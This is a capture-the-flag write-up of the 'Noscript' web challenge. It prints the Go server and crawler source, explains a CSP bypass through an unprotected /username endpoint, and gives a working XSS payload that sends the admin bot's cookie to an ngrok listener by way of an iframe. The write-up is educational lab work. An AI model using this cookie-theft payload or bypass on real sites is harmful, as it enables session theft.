---
title: "Web: Noscript (normal)"
date: "2024-06-23"
thumbnail: "/assets/img/thumbnail/wani24.png"
---

# Description
---

Ignite it to steal the cookie!

Flag Format: FLAG{...}

# Solution

We have the source code of this challange
This is the main
```go
package main

import (
	"context"
	"fmt"
	"html/template"
	"net/http"
	"os"
	"regexp"
	"sync"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/redis/go-redis/v9"
)

type InMemoryDB struct {
	data map[string][2]string
	mu   sync.RWMutex
}

func NewInMemoryDB() *InMemoryDB {
	return &InMemoryDB{
		data: make(map[string][2]string),
	}
}

func (db *InMemoryDB) Set(key, value1, value2 string) {
	db.mu.Lock()
	defer db.mu.Unlock()
	db.data[key] = [2]string{value1, value2}
}

func (db *InMemoryDB) Get(key string) ([2]string, bool) {
	db.mu.RLock()
	defer db.mu.RUnlock()
	vals, exists := db.data[key]
	return vals, exists
}

func (db *InMemoryDB) Delete(key string) {
	db.mu.Lock()
	defer db.mu.Unlock()
	delete(db.data, key)
}

func main() {
	ctx := context.Background()

	db := NewInMemoryDB()

	redisAddr := fmt.Sprintf("%s:%s", os.Getenv("REDIS_HOST"), os.Getenv("REDIS_PORT"))
	redisClient := redis.NewClient(&redis.Options{
		Addr: redisAddr,
	})

	r := gin.Default()
	r.LoadHTMLGlob("templates/*")

	// Home page
	r.GET("/", func(c *gin.Context) {
		c.HTML(http.StatusOK, "index.html", gin.H{
			"title": "Noscript!",
		})
	})

	// Sign in
	r.POST("/signin", func(c *gin.Context) {
		id := uuid.New().String()
		db.Set(id, "test user", "test profile")
		c.Redirect(http.StatusMovedPermanently, "/user/"+id)
	})

	// Get user profiles
	r.GET("/user/:id", func(c *gin.Context) {
		c.Header("Content-Security-Policy", "default-src 'self', script-src 'none'")
		id := c.Param("id")
		re := regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$")
		if re.MatchString(id) {
			if val, ok := db.Get(id); ok {
				params := map[string]interface{}{
					"id":       id,
					"username": val[0],
					"profile":  template.HTML(val[1]),
				}
				c.HTML(http.StatusOK, "user.html", params)
			} else {
				_, _ = c.Writer.WriteString("<p>user not found <a href='/'>Home</a></p>")
			}
		} else {
			_, _ = c.Writer.WriteString("<p>invalid id <a href='/'>Home</a></p>")
		}
	})

	// Modify user profiles
	r.POST("/user/:id/", func(c *gin.Context) {
		id := c.Param("id")
		re := regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$")
		if re.MatchString(id) {
			if _, ok := db.Get(id); ok {
				username := c.PostForm("username")
				profile := c.PostForm("profile")
				db.Delete(id)
				db.Set(id, username, profile)
				if _, ok := db.Get(id); ok {
					c.Redirect(http.StatusMovedPermanently, "/user/"+id)
				} else {
					_, _ = c.Writer.WriteString("<p>user not found <a href='/'>Home</a></p>")
				}
			} else {
				_, _ = c.Writer.WriteString("<p>user not found <a href='/'>Home</a></p>")
			}
		} else {
			_, _ = c.Writer.WriteString("<p>invalid id <a href='/'>Home</a></p>")
		}
	})

	// Get username API
	r.GET("/username/:id", func(c *gin.Context) {
		id := c.Param("id")
		re := regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$")
		if re.MatchString(id) {
			if val, ok := db.Get(id); ok {
				_, _ = c.Writer.WriteString(val[0])
			} else {
				_, _ = c.Writer.WriteString("<p>user not found <a href='/'>Home</a></p>")
			}
		} else {
			_, _ = c.Writer.WriteString("<p>invalid id <a href='/'>Home</a></p>")
		}
	})

	// Report API
	r.POST("/report", func(c *gin.Context) {
		url := c.PostForm("url") // URL to report, example : "/user/ce93310c-b549-4fe2-9afa-a298dc4cb78d"
		re := regexp.MustCompile("^/user/[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$")
		if re.MatchString(url) {
			if err := redisClient.RPush(ctx, "url", url).Err(); err != nil {
				_, _ = c.Writer.WriteString("<p>Failed to report <a href='/'>Home</a></p>")
				return
			}
			if err := redisClient.Incr(ctx, "queued_count").Err(); err != nil {
				_, _ = c.Writer.WriteString("<p>Failed to report <a href='/'>Home</a></p>")
				return
			}
			_, _ = c.Writer.WriteString("<p>Reported! <a href='/'>Home</a></p>")
		} else {
			_, _ = c.Writer.WriteString("<p>invalid url <a href='/'>Home</a></p>")
		}
	})

	if err := r.Run(); err != nil {
		panic(err)
	}
}
```
It has many functionalities
- `POST /signin` will signin for us a new user and it will generate its id directly then forward us to `/user/id`
- `GET /user/:id` It's like user page contains data like username & profile (content security policy applied here)
- `POST /user/:id` Here we can modify the username and the profile of the user
- `GET /username/:id` It's like user page contains data like username & profile (no content security policy here)
- `POST /report` It accepts url parameter which is `/user/:id` and there's a crawler within the source code indicating that after reporting the `/user/:id` is fetched by the bot

The code of the crawler
```js
const { chromium } = require("playwright");
const Redis = require("ioredis");
const connection = new Redis({
  host: process.env.REDIS_HOST,
  port: process.env.REDIS_PORT,
});

const APP_URL = process.env.APP_URL; // application URL
const HOST = process.env.HOST; // HOST
const FLAG = process.env.FLAG; // FLAG

const crawl = async (path) => {
  const browser = await chromium.launch();
  const page = await browser.newPage();
  const cookie = [
    {
      name: "flag",
      value: FLAG,
      domain: HOST,
      path: "/",
      expires: Date.now() / 1000 + 100000,
    },
  ];
  page.context().addCookies(cookie);
  try {
    await page.goto(APP_URL + path, {
      waitUntil: "domcontentloaded",
      timeout: 3000,
    });
    await page.waitForTimeout(1000);
    await page.close();
  } catch (err) {
    console.error("crawl", err.message);
  } finally {
    await browser.close();
    console.log("crawl", "browser closed");
  }
};

(async () => {
  while (true) {
    console.log(
      "[*] waiting new url",
      await connection.get("queued_count"),
      await connection.get("proceeded_count"),
    );
    await connection
      .blpop("url", 0)
      .then((v) => {
        const path = v[1];
        console.log("crawl", path);
        return crawl(path);
      })
      .then(() => {
        console.log("crawl", "finished");
        return connection.incr("proceeded_count");
      })
      .catch((e) => {
        console.log("crawl", e);
      });
  }
})();
```

let's see the site now
When we first open the challange we see this
<img src="/assets/img/wani24/capture4.png">
when we click sign in it makes `POST /signin` and forwards us to `/user/id`
<img src="/assets/img/wani24/capture5.png">
fromn the code, the profile parameter is transelated as html entity `"profile":  template.HTML(val[1])` and we can see that in case we gave it value like `<script>alert()</script>` and this won't happen to the username as it's treated as normal string
<img src="/assets/img/wani24/capture6.png">
> No alert Triggered cuz of the content security policy
but in `/username/id` There's no content security policy and it renders the value stored in the username so when we visit this endpoint the alert will be triggered
<img src="/assets/img/wani24/capture7.png">
Very Nice notes !!

Back to Home page and you will see `submit to admin` which accepts `/user/:id` and reports this page to the admin and the admin bot(crawler) will fetch this page.
The problem the there's content security policy on `/user/:id` so there's no xss triggered when the admin bot fetches this page.

After looking at the code we can find that the content security policy is `"default-src 'self', script-src 'none'` which means that the resources which can loaded are from the same origin, so the profile parameter if we try using html entity that visits malicious this won't work cuz the site must be in the same origin.

The idea here is making The html entity in the profile visits `/username/:id` which doesn't have any csp applied and the xss payload existing in the username can be triggered.
So we can put XSS payload to steal cookie in the username field and in the profile field we put HTML entity that makes the crawler fetch `/username/:id` and triggers the XSS

After trying we will find these parameters will work 
```js
Username: <script>var i=new Image(); i.src="http://ngroc_ip:ngroc_port/?cookie="+btoa(document.cookie);</script>
Profile: <iframe src="/username/:id"></iframe>
```
we will start ngroc using `ngroc tcp 4444`
then listen on port 4444
after reporting we will find this the cookie on the port 4444
<img src="/assets/img/wani24/capture8.png">

Congratzzzzzzzzzz